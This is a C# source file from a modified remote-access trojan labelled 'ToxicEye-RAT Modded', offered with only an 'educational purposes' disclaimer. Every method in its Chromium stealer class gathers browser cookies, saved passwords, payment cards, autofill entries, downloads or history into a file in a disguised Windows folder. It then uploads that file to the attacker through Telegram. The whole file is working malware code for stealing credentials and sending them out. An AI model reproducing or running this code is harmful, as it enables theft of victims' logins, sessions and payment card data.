/* 
       ^ Author    : LimerBoy && c0z3dc0
       ^ Name      : ToxicEye-RAT Modded
       ^ Github    : https://github.com/LimerBoy && https://github.com/c0z3dc0

       > This program is distributed for educational purposes only.
*/


using Stelaer;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TelegramRAT.core.stealer.Chrom
{
    class cGetChromium
    {

        public static string path = @"C:\Windows\System\overide\";
        
        public static void getCookie()
        {
            Chromium.GetCookies(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\Cookies.txt", true);
        }
        public static void getPasswords()
        {
            Chromium.GetPasswords(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\Passwords.txt", true);
        }
        public static void getCards()
        {
            Chromium.GetCards(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\Cards.txt", true);
        }
        public static void getAutofills()
        {
            Chromium.GetAutofills(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\Autofills.txt", true);
        }
        public static void getDownloads()
        {
            Chromium.GetDownloads(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\Downloads.txt", true);
        }
        public static void getHistory()
        {
            Chromium.GetHistory(path);
            Thread.Sleep(1500);
            telegram.UploadFile(path + "\\History.txt", true);
        }
    }
}
